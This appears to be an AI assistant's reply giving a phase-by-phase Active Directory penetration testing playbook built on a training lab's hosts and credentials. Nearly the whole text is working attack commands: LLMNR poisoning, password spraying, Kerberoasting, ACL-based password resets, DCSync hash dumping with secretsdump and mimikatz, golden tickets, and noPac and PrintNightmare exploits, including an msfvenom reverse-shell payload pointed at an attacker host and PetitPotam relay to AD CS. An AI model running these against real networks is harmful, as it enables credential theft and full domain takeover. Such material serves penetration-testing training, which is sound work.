Of course. Here is a comprehensive, step-by-step guide to Active Directory penetration testing, built from your provided commands with detailed explanations, methodologies, and an in-depth look at ACL exploitation.

-----

## Phase 1: External Reconnaissance (OSINT) üïµÔ∏è

This initial phase involves gathering intelligence from public sources without directly touching the target's infrastructure. It's about building a foundational understanding of the target from the outside in.

  * **Methodology**: Use public websites, search engine "dorking," and data breach repositories to discover the target's domain structure, employee names, email formats, and any publicly leaked credentials or sensitive documents. This information is crucial for building user lists and understanding the potential attack surface.
  * **What to look for**: Domain names, IP ranges, technology stacks, employee names (for generating usernames), email address patterns, and any credentials exposed in data breaches.

<!-- end list -->

```shell
# Use online tools like viewdns.info for DNS lookups, reverse IP lookups, and general domain information.
viewdns.info

# Perform DNS lookups to identify name servers, mail servers (MX), and other critical DNS records.
nslookup ns1.inlanefreight.com

# Use tools like linkedin2username to scrape LinkedIn for employee names and generate potential username lists based on common formats (e.g., f.lastname, flastname).
linkedin2username

# Use Google Dorks to find sensitive documents or information unintentionally exposed on the internet.
filetype:pdf inurl:inlanefreight.com confidential
intext:"@inlanefreight.com" "password"

# Check data breach repositories like Dehashed for credentials associated with the target domain.
sudo python3 dehashed.py -q inlanefreight.local -p
```

-----

## Phase 2: Initial Internal Enumeration & Network Mapping üó∫Ô∏è

Once you have a foothold on the internal network, the first step is to create a map of the environment. The primary goal is to identify live hosts, understand the network topology, and pinpoint the location of the Domain Controllers (DCs).

  * **Methodology**: Combine passive listening with active network scanning. Passive tools like `Wireshark` and `tcpdump` can reveal hosts and protocols without generating noise. Active tools like `fping` and `nmap` then probe the network to confirm live hosts and enumerate open ports and services.
  * **What to look for**: Live IP addresses, the domain name, Domain Controller hostnames/IPs (often broadcasting DNS, Kerberos, LDAP), open ports (especially `53`, `88`, `135`, `139`, `389`, `445`, `3268`), and service versions that might indicate vulnerabilities.

<!-- end list -->

```shell
# Passively sniff network traffic to identify hosts, protocols, and potential credentials in transit. Look for broadcast traffic like ARP, DNS, and NBNS.
sudo -E wireshark
sudo tcpdump -i ens224

# Use Responder in analyze-only mode to identify hosts sending LLMNR/NBT-NS queries without poisoning them.
sudo responder -I ens224 -A

# Perform a fast ping sweep to identify all live hosts on the subnet.
fping -asgq 172.16.5.0/23 > hosts.txt

# Run a comprehensive Nmap scan on the discovered live hosts. This will perform OS detection, service versioning, and run default scripts to find vulnerabilities.
sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum
```

-----

## Phase 3: Unauthenticated Attacks & Enumeration üëÇ

With the Domain Controller identified, you can perform enumeration without having any valid credentials. This phase aims to discover valid usernames, understand domain policies, and potentially capture password hashes.

  * **Methodology**: Leverage insecure legacy protocols (LLMNR/NBT-NS), query services that allow anonymous binds (RPC, LDAP, SMB), and use tools like `kerbrute` to validate potential usernames against the Kerberos service without causing lockouts.
  * **What to look for**: A list of valid usernames, the domain password policy (complexity, length, lockout threshold), and NTLMv2 hashes that can be cracked offline.

### LLMNR/NBT-NS Poisoning

This attack spoofs responses to name resolution requests, tricking clients into authenticating to an attacker-controlled machine and sending their password hashes.

```shell
# From Linux, run Responder to listen for and poison LLMNR/NBT-NS requests. It will automatically save captured hashes.
sudo responder -I ens224

# Once a hash is captured, use Hashcat to crack it offline with a wordlist. Mode 5600 is for NTLMv2.
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt

# From Windows, Inveigh performs the same function as Responder.
Import-Module .\Inveigh.ps1
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```

### Unauthenticated User & Policy Enumeration

Gathering details about users and domain-wide policies without any credentials.

```shell
# Use CrackMapExec to query the domain password policy via an anonymous SMB session.
crackmapexec smb 172.16.5.5 -u '' -p '' --pass-pol

# Connect to the RPC service anonymously to query domain information.
rpcclient -U "" -N 172.16.5.5 # Once connected, run 'querydominfo'

# Use enum4linux-ng for a comprehensive sweep of null-session enumeration techniques.
enum4linux-ng -P 172.16.5.5 -oA ilfreight

# Query LDAP anonymously to find the password policy object (pwdHistoryLength is an attribute of it).
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows, establish a null session and query domain accounts.
net use \\DC01\ipc$ "" /u:""
net accounts

# Use PowerView to get the default domain policy.
Import-Module .\PowerView.ps1
Get-DomainPolicy
```

### Username Enumeration

Confirming valid usernames is critical before launching password-based attacks.

```shell
# Use Kerbrute to safely enumerate usernames against Kerberos. It checks for the "KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN" response, which doesn't trigger failed login events.
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users

# Use other tools that leverage anonymous RPC/SAMR enumeration.
crackmapexec smb 172.16.5.5 --users
enum4linux -U 172.16.5.5
```

-----

## Phase 4: Gaining Initial Access üîë

With a list of valid usernames, the goal is now to acquire at least one set of valid user credentials.

  * **Methodology**: The two most common techniques are **Password Spraying** (testing one or a few common, seasonal, or default passwords against many users to avoid lockouts) and **AS-REP Roasting** (exploiting user accounts that do not require Kerberos pre-authentication).
  * **What to look for**: A successful login, indicated by tools like `CrackMapExec` or a crackable hash from an AS-REP Roastable user.

### Password Spraying

```shell
# Use CrackMapExec to spray a single password over SMB. The '+' indicates a successful login.
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p 'Winter2025!' | grep +

# Use Kerbrute for a stealthier, Kerberos-based password spray.
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1

# On Windows, use a dedicated PowerShell tool to perform the spray.
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

### AS-REP Roasting

This attacks users where the "Do not require Kerberos preauthentication" flag is set. Anyone can request an AS-REP ticket for these users, and the ticket's encrypted part (containing the user's hash) can be cracked offline.

```shell
# Use GetNPUsers.py from impacket to find vulnerable users and request their hashes.
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users

# On Windows, use Rubeus or PowerView.
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
Get-DomainUser -PreauthNotRequired

# Crack the obtained hash (mode 18200) with Hashcat.
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
```

-----

## Phase 5: Authenticated Enumeration & Situational Awareness üïµÔ∏è‚Äç‚ôÄÔ∏è

With valid credentials, you can perform a much deeper enumeration of the domain to map out privilege escalation paths. This is where you gain situational awareness.

  * **Methodology**: Use tools like **BloodHound** to collect and visualize AD data, creating a graphical map of attack paths. Use tools like `CrackMapExec` with credentials to scan the network for sessions and access. On a compromised host, use native tools ("Living off the Land") to understand the local environment.
  * **What to look for**: High-privilege group memberships, sensitive data on file shares, local admin rights on other machines, unconstrained delegation, abusable ACLs, and interesting user/computer object descriptions.

### "Living Off the Land" (On a Compromised Host)

Use built-in Windows tools to understand the machine you've landed on.

```powershell
# Check for security products, PowerShell version, and lockdown policies.
Get-MpComputerStatus
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
$ExecutionContext.SessionState.LanguageMode

# Enumerate network and domain information from the host's perspective.
arp -a
route print
wmic ntdomain get Caption,DnsForestName,DomainName,DomainControllerAddress

# Enumerate users, groups, and logged-in sessions.
qwinsta # Who else is logged on?
net group /domain
net user wrouse /domain
net localgroup Administrators

# Use the powerful dsquery tool for specific AD object searches.
dsquery user -name "admin*" # Find users with 'admin' in their name
dsquery computer -inactive 4 # Find computers inactive for 4 weeks
# Find users with Unconstrained Delegation enabled
dsquery * -filter "(userAccountControl:1.2.840.11356.1.4.803:=524288)" -limit 0
```

### Credentialed Domain Enumeration

Use your compromised credentials to map the entire domain.

```shell
# BloodHound is the premier tool for finding attack paths.
# Linux Collector:
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
# Windows Collector:
.\SharpHound.exe -c All --zipfilename ILFREIGHT.zip

# Use CrackMapExec with credentials to find who has sessions where, what shares are accessible, etc.
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares

# Use Snaffler to hunt for sensitive files on all readable shares.
Snaffler.exe -s -d inlanefreight.local -u forend -p Klmcargo2 -o snaffler.log -v

# On Windows, use the ActiveDirectory module or PowerView for granular queries.
Import-Module ActiveDirectory
Get-ADGroupMember -Identity "Domain Admins" -Recurse
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName # Find Kerberoastable users
Get-ADTrust -Filter * # Enumerate domain trusts
```

-----

## Phase 6: Privilege Escalation üöÄ

Using the data from authenticated enumeration, you can now exploit misconfigurations to escalate your privileges.

  * **Methodology**: Target specific weaknesses like service accounts with crackable passwords (**Kerberoasting**), improperly configured permissions (**ACL Abuse**), or credentials stored in places like Group Policy Preferences (**GPP**).
  * **What to look for**: Service Principal Names (SPNs) linked to weak user accounts, dangerous ACLs granting modification rights over privileged objects, and passwords or hashes stored in world-readable locations.

### Kerberoasting

This attack requests service tickets (TGS) for accounts with an SPN. The encrypted portion of the ticket is signed with the service account's NTLM hash, which can be cracked offline.

```shell
# Linux: Use GetUserSPNs.py to request and dump the TGS hashes.
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request

# Windows: Rubeus is the go-to tool.
.\Rubeus.exe kerberoast /nowrap

# Crack the TGS hash (mode 13100) with Hashcat.
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force
```

### In-Depth ACL Abuse

Access Control Lists (ACLs) define permissions. Misconfigurations can allow a low-privilege user to take control of high-privilege objects.

| Permission / Right | What it allows | Exploitation Method |
| :--- | :--- | :--- |
| **GenericAll** | Full control over the object. The "god mode" of permissions. | Can add yourself to the target group, or reset a user's password. |
| **WriteDacl** | Modify the object's permissions. | Grant yourself `GenericAll` rights on the object, then proceed. |
| **WriteOwner** | Take ownership of the object. | Take ownership, then grant yourself `GenericAll` rights. |
| **WriteProperty** | Modify attributes of the object. | Can modify `member` attribute to add yourself to a group. |
| **Self-membership** | Allows a user to add themselves to a group. | `Add-DomainGroupMember` |
| **ForceChangePassword** | Reset a user's password without knowing the current one. | `Set-DomainUserPassword` with `User-Force-Change-Password` extended right. |
| **DS-Replication-Get-Changes** | Allows for DCSync attacks. The "keys to the kingdom." | Use `secretsdump.py` or `mimikatz` to dump all domain hashes. |

**Methodology for Exploitation:**

1.  **Find Dangerous ACLs**: Use BloodHound's analysis tab or PowerView to find abusable ACLs pointing to your compromised user.
    ```powershell
    # Find any interesting ACLs related to your user
    Find-InterestingDomainAcl -ResolveGUIDs | ?{($_.IdentityReference -match "wley")}
    ```
2.  **Analyze the Right**: Determine which of the dangerous rights you have over which object (e.g., `forend` has `ForceChangePassword` over the `Domain Admins` group).
    ```powershell
    # Get the ACL for a specific target object, like the Domain Admins group
    Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs
    ```
3.  **Exploit**: Use the appropriate tool or command to leverage the permission.
    ```powershell
    # Example: User 'wley' has ForceChangePassword over 'damundsen'
    $wleyCred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', (ConvertTo-SecureString 'Password123' -AsPlainText -Force))
    Set-DomainUserPassword -Identity damundsen -AccountPassword (ConvertTo-SecureString 'Pwn3d_By_ACLs!' -AsPlainText -Force) -Credential $wleyCred

    # Example: User 'damundsen' has WriteProperty/Add-Member rights to "Help Desk Level 1" group
    $damundsenCred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', (ConvertTo-SecureString 'Pwn3d_By_ACLs!' -AsPlainText -Force))
    Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $damundsenCred
    ```

### Miscellaneous Misconfigurations

```shell
# Look for credentials stored in Group Policy Preferences (an old but still found vulnerability).
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE

# Search SYSVOL for scripts and configuration files that may contain hardcoded passwords.
ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs
```

-----

## Phase 7: Domain Dominance üëë

The ultimate goal: achieving full, persistent control over the Active Directory domain.

  * **Methodology**: The primary path to domain dominance is by compromising an account with **DCSync** rights. This permission allows a principal to replicate all password hashes from a Domain Controller, effectively giving you the keys to every account.
  * **What to look for**: An account with the extended rights `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`.

<!-- end list -->

```shell
# From a compromised host, find users with DCSync rights using PowerView.
$sid = Convert-NameToSid adunn
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -eq 'Replication-Get-Changes-All')} | ?{$_.SecurityIdentifier -eq $sid}

# From Linux, use secretsdump.py to perform the DCSync attack. This dumps all NTLM hashes from the domain.
secretsdump.py -just-dc INLANEFREIGHT/adunn@172.16.5.5

# From Windows, use mimikatz. The quintessential AD hacking tool.
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:krbtgt" "exit"
```

-----

## Phase 8: Lateral Movement & Cross-Trust Attacks ‚û°Ô∏è

Once you have high privileges, you can move across the network to access other systems or pivot into trusted domains.

  * **Methodology**: Use credentials (passwords or hashes) to authenticate to other machines using protocols like SMB (`psexec`), WinRM (`evil-winrm`), or WMI (`wmiexec`). For trusts, enumerate them and use tickets or credentials to access resources in the foreign domain.
  * **What to look for**: Local administrator access on workstations and servers, interesting data on other machines, and trust relationships that can be abused.

### Privileged Access & Lateral Movement

```shell
# Check who has RDP or WinRM access to a target machine.
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"

# Use evil-winrm (WinRM) or Enter-PSSession for interactive shells.
evil-winrm -i 10.129.201.234 -u forend -p <password>
Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential (Get-Credential)

# Use impacket tools for remote command execution (psexec is often caught by AV, wmiexec is stealthier).
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```

### Attacking Domain Trusts

```shell
# Enumerate trusts from Windows.
Get-ADTrust -Filter *
Get-DomainTrustMapping

# Enumerate trusts from Linux.
netdom query /domain:inlanefreight.local trust

# Once you have DA in one domain, you can often access resources in the other.
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator

# If you have the krbtgt hash of a domain, you can forge a Golden Ticket to impersonate an Enterprise Admin and access the trusted domain.
ticketer.py -nthash <krbtgt_hash> -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid <logistics_sid> -extra-sid <target_EA_sid> hacker
export KRB5CCNAME=hacker.ccache
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass
```

-----

## Phase 9: Advanced & "Bleeding Edge" Attacks ü©∏

This covers modern vulnerabilities and advanced techniques that can lead to rapid compromise.

  * **Methodology**: Scan for specific unpatched CVEs like **noPac** or **PrintNightmare**, and exploit misconfigurations in Active Directory Certificate Services (AD CS).
  * **What to look for**: Vulnerable services, weak certificate templates (ESC1-ESC8), and patch levels.

<!-- end list -->

```shell
# Scan for and exploit noPac (CVE-2021-42278 & CVE-2021-42287) to escalate to DA.
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 --impersonate administrator -shell

# Exploit PrintNightmare (CVE-2021-1675) for remote code execution on a vulnerable DC.
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=8080 -f dll > payload.dll
sudo smbserver.py -smb2support CompData .
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\<attacker_ip>\CompData\payload.dll'

# Coerce authentication from a DC using PetitPotam and relay it to AD CS to get a certificate for the DC's computer account (ADCS Relay).
# Start relay:
sudo ntlmrelayx.py -t http://<adcs_server>/certsrv/certfnsh.asp --adcs --template DomainController
# Coerce auth:
python3 PetitPotam.py <attacker_ip> <dc_ip>

# Use the obtained certificate with PKINIT to get a TGT for the DC, then perform DCSync.
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <base64_cert> dc01.ccache
export KRB5CCNAME=dc01.ccache
secretsdump.py -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```
